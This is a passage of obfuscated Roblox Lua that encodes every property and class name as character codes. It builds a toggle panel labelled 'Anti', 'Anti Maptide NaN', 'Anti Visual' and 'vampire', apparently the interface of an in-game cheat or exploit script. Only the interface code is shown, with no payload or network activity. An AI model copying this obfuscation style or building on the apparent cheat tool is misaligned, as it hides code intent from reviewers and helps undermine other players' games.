_llza[_sc(50,99,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,49)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(50,99,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(50,99,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,99,50)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(50,99,49)]);
_llza[_sc(50,99,51)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(50,98,101)]);
_llza[_sc(50,99,51)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(50,99,51)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(50,99,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,99,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,99,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,52)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(50,99,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,99,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,53)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,99,52)]);
_llza[_sc(50,99,53)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,99,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,99,53)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,99,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,99,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,99,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,99,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,53)][_sc(84,101,120,116)]=[[Anti]];
_llza[_sc(50,99,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,99,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(50,99,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,99,53)]);
_llza[_sc(50,99,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,99,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,99,53)]);
_llza[_sc(50,99,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(50,99,56)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,99,52)]);
_llza[_sc(50,99,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,56)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,99,56)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,99,56)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,99,56)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,56)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(50,99,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,56)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(50,99,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(50,99,56)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(50,99,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,99,57)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,99,57)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(50,99,57)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,99,57)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(50,99,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,99,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,99,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,99,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,97)][_sc(78,97,109,101)]=[[maptidenan]];
_llza[_sc(50,99,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,99,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,99,97)]);
_llza[_sc(50,99,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,99,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,99,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,98)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,99,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99,98)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,99,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,99,98)]);
_llza[_sc(50,99,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,99,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,99,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,99,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,99,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,99,98)]);
_llza[_sc(50,99,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,99,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,99,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,99,100)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,99,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,99,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,99,100)]);
_llza[_sc(50,99,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,99,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,99,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,99,100)]);
_llza[_sc(50,99,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,99,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,102)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,99,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,100,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,99,102)]);
_llza[_sc(50,100,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,100,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,100,49)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,99,97)]);
_llza[_sc(50,100,49)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,100,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,100,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,100,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,100,49)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,100,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,100,49)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,100,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,100,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,100,49)][_sc(84,101,120,116)]=[[Anti Maptide NaN]];
_llza[_sc(50,100,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,100,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,100,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,100,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,100,49)]);
_llza[_sc(50,100,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,100,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,100,49)]);
_llza[_sc(50,100,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,100,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,99,97)]);
_llza[_sc(50,100,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,100,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,100,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 10);
_llza[_sc(50,100,53)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(50,100,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,100,53)][_sc(78,97,109,101)]=[[---DIVIDER---]];
_llza[_sc(50,100,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,100,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,100,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,100,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,100,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,100,53)]);
_llza[_sc(50,100,54)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,100,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,100,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,100,54)][_sc(78,97,109,101)]=[[dividerFrame]];
_llza[_sc(50,100,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,100,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,100,54)]);
_llza[_sc(50,100,55)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,100,55)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,100,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,100,54)]);
_llza[_sc(50,100,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,100,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,100,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,100,56)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,100,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,100,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,100,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,100,56)]);
_llza[_sc(50,100,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,100,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,100,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,100,54)]);
_llza[_sc(50,100,97)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,100,98)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(50,100,54)]);
_llza[_sc(50,100,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,100,53)]);
_llza[_sc(50,100,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,100,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,100,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 6);
_llza[_sc(50,100,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(50,100,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,100,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,100,100)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,100,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,100,100)][_sc(78,97,109,101)]=[[visual]];
_llza[_sc(50,100,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,100,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,100,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,100,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,100,101)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,100,100)]);
_llza[_sc(50,100,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,100,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,100,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,100,101)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,100,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,100,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,100,101)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,100,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,100,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,100,101)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,100,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,100,101)]);
_llza[_sc(50,100,102)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,100,102)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,100,102)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,100,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,101,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,100,101)]);
_llza[_sc(50,101,48)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,101,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,101,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,101,48)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,101,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,101,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,101,48)]);
_llza[_sc(50,101,49)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,101,49)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,101,50)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,101,48)]);
_llza[_sc(50,101,50)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,101,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,50)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,101,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,101,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,51)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,101,50)]);
_llza[_sc(50,101,51)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,101,51)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,101,52)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,100,100)]);
_llza[_sc(50,101,52)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,101,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,101,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,101,52)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,101,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,101,52)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,101,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,52)][_sc(84,101,120,116)]=[[Anti Visual]];
_llza[_sc(50,101,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,101,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,101,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,101,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,101,52)]);
_llza[_sc(50,101,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,101,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,101,52)]);
_llza[_sc(50,101,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,101,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,100,100)]);
_llza[_sc(50,101,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,101,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,101,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,101,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,101,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,56)][_sc(78,97,109,101)]=[[vampire]];
_llza[_sc(50,101,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,101,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,101,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,101,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,57)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,101,56)]);
_llza[_sc(50,101,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,101,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,101,57)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,101,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,101,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,57)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,101,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,101,57)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,101,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,101,57)]);
_llza[_sc(50,101,97)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,101,97)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,101,97)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,101,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,101,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,101,57)]);
_llza[_sc(50,101,98)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,101,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,101,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,101,98)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,101,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,101,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,101,98)]);
_llza[_sc(50,101,99)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,101,99)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,101,100)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,101,98)]);
_llza[_sc(50,101,100)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,101,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,101,100)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,101,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,101,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,101,101)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,101,100)]);
_llza[_sc(50,101,101)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,101,101)][_sc(82,111,116,97,116,105,111,110)]=90;
